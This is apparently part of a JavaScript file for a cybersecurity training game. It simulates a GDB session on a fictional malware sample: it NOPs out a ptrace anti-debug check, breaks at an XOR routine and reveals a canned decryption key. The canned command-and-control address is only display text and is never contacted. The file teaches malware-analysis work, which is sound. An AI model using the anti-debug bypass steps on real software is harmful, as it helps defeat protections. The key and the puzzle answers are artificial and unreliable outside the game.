                if (A16Config._state.gdbBreakpointSet) {
                    A16Config._state.keyExtracted = true;
                    return `Starting program: /home/kali/crimson_ghost
[*] Anti-debug check bypassed (NOPs at 0x401090)
[*] Initializing...
[*] Decoding C2 address...
[*] Connecting to command node...

Breakpoint 1, 0x00000000004011a0 in ?? ()

[*] Execution paused at XOR decryption routine (0x4011a0)
    The decryption key should be in register $rdi.

    (gdb) x/s $rdi     — examine key as string
    (gdb) info reg rdi  — show register value
    (gdb) x/20bx $rdi  — examine key as hex bytes`;
                }

                return `Starting program: /home/kali/crimson_ghost
[*] Anti-debug check bypassed (NOPs at 0x401090)
[*] Initializing...
[*] Decoding C2 address: 192.168.13.37
[*] Connecting to command node...
[*] Connection established to 192.168.13.37:4443
[*] Receiving payload... (2048 bytes)
[*] Decrypting payload...
[*] Payload decrypted successfully
[*] Executing stage 2...

[Inferior 1 (process 4102) exited normally]

[!] The binary ran to completion. Set a breakpoint at the XOR
    decryption routine to catch the key before it's used:

    (gdb) break *0x4011a0
    (gdb) run`;
            },

            'r': function(args, term, engine) {
                return gdbCmds['run'](args, term, engine);
            },

            'break': function(args, term, engine) {
                const addr = args[0] || '';
                if (addr === '*0x4011a0') {
                    A16Config._state.gdbBreakpointSet = true;
                    return `Breakpoint 1 at 0x4011a0
[*] Breakpoint set at XOR decryption routine.
    Run the program to hit the breakpoint: (gdb) run`;
                }
                if (addr === '*0x401090') {
                    return `Breakpoint 1 at 0x401090
[*] Breakpoint set at anti-debug check.`;
                }
                if (addr === '*0x4010c0') {
                    return `Breakpoint 1 at 0x4010c0
[*] Breakpoint set at base64_decode().`;
                }
                if (addr === '*0x4010f0') {
                    return `Breakpoint 1 at 0x4010f0
[*] Breakpoint set at c2_connect().`;
                }
                if (!addr) return 'Usage: break *<address>';
                return `Breakpoint at ${addr}`;
            },

            'b': function(args, term, engine) {
                return gdbCmds['break'](args, term, engine);
            },

            'set': function(args, term, engine) {
                const fullArgs = args.join(' ');

                // NOP patch for ptrace anti-debug
                if (fullArgs.includes('0x401090') && (fullArgs.includes('0x90909090') || fullArgs.includes('0x9090'))) {
                    A16Config._state.gdbPtracePatched = true;
                    A16Config._state.antiDebugBypassed = true;
                    return `[*] Patched: 0x401090 = 0x90909090 (NOP sled)
[*] Anti-debug ptrace check neutralized.
    The binary will no longer detect the debugger.
    Run the program: (gdb) run`;
                }

                if (fullArgs.includes('0x401094') && fullArgs.includes('0x90909090')) {
                    return '[*] Patched: 0x401094 = 0x90909090 (continued NOP sled)';
                }
                if (fullArgs.includes('0x401098') && fullArgs.includes('0x9090')) {
                    return '[*] Patched: 0x401098 = 0x9090 (NOP)';
                }
                if (fullArgs.includes('0x40109a') && fullArgs.includes('0x90')) {
                    return '[*] Patched: 0x40109a = 0x90 (NOP)';
                }

                return `Set: ${fullArgs}`;
            },

            'x/s': function(args, term, engine) {
                const target = args[0] || '';
                if (target === '$rdi') {
                    if (A16Config._state.gdbBreakpointSet && A16Config._state.gdbPtracePatched) {
                        A16Config._state.keyExtracted = true;
                        return `0x403040:  "Gh0stK3y_X0R_2024"

[+] XOR decryption key recovered: Gh0stK3y_X0R_2024
[+] Use this key with decrypt.py:
    python3 tools/decrypt.py Gh0stK3y_X0R_2024`;
                    }
                    return `0x0:  <error: Cannot access memory at address 0x0>
[!] No program running. Start with: (gdb) run`;
                }
                if (target === '$rsi') {
                    return `0x7fffe8a04000:  "\\x43\\x47\\x02\\x02\\x01\\xff\\x8a<\\xe7\\xb2..."
[*] This is the encrypted payload buffer (2048 bytes)`;
                }
                if (target === '$rip') {
                    return `0x4011a0:  "\\x55\\x48\\x89\\xe5..."  (xor_decrypt prologue)`;
                }
                return `Usage: x/s <address or $register>`;
            },

            'x/20bx': function(args, term, engine) {
                const target = args[0] || '';
                if (target === '$rdi') {
                    return `0x403040:  0x47 0x68 0x30 0x73 0x74 0x4b 0x33 0x79
0x403048:  0x5f 0x58 0x30 0x52 0x5f 0x32 0x30 0x32
0x403050:  0x34 0x00 0x00 0x00

[*] ASCII: G h 0 s t K 3 y _ X 0 R _ 2 0 2 4 \\0
[*] Key string: "Gh0stK3y_X0R_2024" (18 bytes)`;
                }
                return `Usage: x/20bx <address or $register>`;
            },

            'info': function(args, term, engine) {
                if (args[0] === 'reg' || args[0] === 'registers') {
                    if (A16Config._state.gdbBreakpointSet && A16Config._state.gdbPtracePatched) {
                        return `rax            0x0                 0
rbx            0x0                 0
rcx            0x0                 0
rdx            0x800               2048
rsi            0x7fffe8a04000      140736767041536
rdi            0x403040            4206656
rbp            0x7fffe8a03f90      0x7fffe8a03f90
rsp            0x7fffe8a03f80      0x7fffe8a03f80
rip            0x4011a0            0x4011a0

[*] rdi = 0x403040 — points to XOR key string
[*] rsi = 0x7fffe8a04000 — points to encrypted payload buffer
[*] rdx = 0x800 (2048) — payload size`;
                    }
                    return 'No program running. Start with: (gdb) run';
                }
                if (args[0] === 'breakpoints' || args[0] === 'break') {
                    if (A16Config._state.gdbBreakpointSet) {
                        return `Num     Type           Disp Enb Address            What
1       breakpoint     keep y   0x00000000004011a0 <xor_decrypt>`;
                    }
                    return 'No breakpoints or watchpoints.';
                }
                if (args.join(' ') === 'reg rdi') {
                    if (A16Config._state.gdbBreakpointSet && A16Config._state.gdbPtracePatched) {
                        return `rdi            0x403040            4206656
[*] Points to: "Gh0stK3y_X0R_2024"`;
                    }
                    return 'rdi            0x0                 0';
                }
                return 'Usage: info <registers|breakpoints|functions|...>';
            },

            'disas': function(args, term, engine) {
                const addr = args[0] || '';
                if (addr.includes('0x4011a0')) {
                    return `Dump of assembler code from 0x4011a0 to 0x4011c4:
   0x4011a0:  push   %rbp
   0x4011a1:  mov    %rsp,%rbp
   0x4011a4:  mov    %rdi,-0x8(%rbp)    ; key pointer
   0x4011a8:  mov    %rsi,-0x10(%rbp)   ; buffer pointer
   0x4011ac:  xor    %eax,%eax          ; i = 0
   0x4011ae:  mov    %rax,%rsi
   0x4011b1:  mov    (%rdi),%rax        ; load key byte
   0x4011b4:  xor    %al,(%rsi,%rcx,1)  ; XOR buffer[i]
   0x4011b7:  inc    %rcx
   0x4011ba:  cmp    %rdx,%rcx
   0x4011bd:  jne    0x4011b1           ; loop until done
   0x4011bf:  mov    %rsi,%rax
   0x4011c2:  pop    %rbp
   0x4011c3:  ret
End of assembler dump.

[*] XOR decryption loop at 0x4011b1-0x4011bd
    rdi = key, rsi = buffer, rdx = length
    Each byte: buffer[i] ^= key[i % key_len]`;
                }
                if (addr.includes('0x401090')) {
                    return `Dump of assembler code from 0x401090 to 0x4010a8:
   0x401090:  mov    $0x65,%eax          ; __NR_ptrace = 101
   0x401095:  xor    %edi,%edi           ; PTRACE_TRACEME = 0
   0x401097:  xor    %esi,%esi
   0x401099:  xor    %edx,%edx
   0x40109b:  syscall                    ; ptrace(TRACEME, 0, 0, 0)
   0x40109d:  cmp    $0xffffffffffffffff,%rax
   0x4010a1:  sete   %al                ; al=1 if debugger present
   0x4010a4:  movzbl %al,%eax
   0x4010a7:  ret
End of assembler dump.

[*] Anti-debug check: ptrace(PTRACE_TRACEME)
    Returns 1 if debugger detected, 0 otherwise.
    NOP this out: set *(int*)0x401090 = 0x90909090`;
                }
                return 'Usage: disas <address>';
            },

            'disassemble': function(args, term, engine) {
                return gdbCmds['disas'](args, term, engine);
            },

            'continue': function(args, term, engine) {
                if (A16Config._state.gdbBreakpointSet && A16Config._state.gdbPtracePatched) {
                    return `Continuing.
[*] XOR decryption completed.
[*] Executing stage 2...

[Inferior 1 (process 4102) exited normally]`;
                }
                return 'The program is not being run.';
            },

            'c': function(args, term, engine) {
                return gdbCmds['continue'](args, term, engine);
            },

            'quit': function(args, term, engine) {
                A16Config._state.gdbActive = false;
                A16Config._state.gdbBreakpointSet = false;
                // Uninstall GDB commands
                A16Config._uninstallGdbCommands(engine);
                return 'Quitting GDB.';
            },

            'q': function(args, term, engine) {
                return gdbCmds['quit'](args, term, engine);
            },

            'help': function(args, term, engine) {
                return `GDB Commands Available:
  run (r)           — Start the program
  break (b) *ADDR   — Set breakpoint at address
  set *(type*)ADDR = VAL — Write memory (use to NOP anti-debug)
  x/s $REG          — Examine register as string
  x/20bx $REG       — Examine register as hex bytes
  info reg          — Show all registers
  info breakpoints  — Show breakpoints
  disas ADDR        — Disassemble at address
  continue (c)      — Continue execution
  quit (q)          — Exit GDB

Key Addresses:
  0x401090  — anti_debug_check() (ptrace)
  0x4010c0  — base64_decode()
  0x4010f0  — c2_connect()
  0x4011a0  — xor_decrypt() *** KEY TARGET ***`;
            }
        };

        // Store GDB commands for installation/removal
        A16Config._gdbCommands = gdbCmds;

        // Install each GDB command into the engine's command registry
        if (engine && engine.addCommand) {
            Object.keys(gdbCmds).forEach(cmd => {
                engine.addCommand(cmd, gdbCmds[cmd]);
            });
        }
    },

    _uninstallGdbCommands(engine) {
        if (A16Config._gdbCommands && engine && engine.removeCommand) {
            Object.keys(A16Config._gdbCommands).forEach(cmd => {
                engine.removeCommand(cmd);
            });
        }
        A16Config._gdbCommands = null;
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _escHtml(str) {
        if (typeof str !== 'string') return String(str);
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        return tmp.textContent.trim();
    },

    resetState: function() {
        this._state = {
        c2Identified: false,
        antiDebugBypassed: false,
        keyExtracted: false,
        gdbActive: false,
        gdbPtracePatched: false,
        gdbBreakpointSet: false,
        sandboxRun: false
    };
    }


};


// Auto-reset state on script load (BOX-006 backfill 2026-05-23)
if (typeof A16Config !== 'undefined') A16Config.resetState();
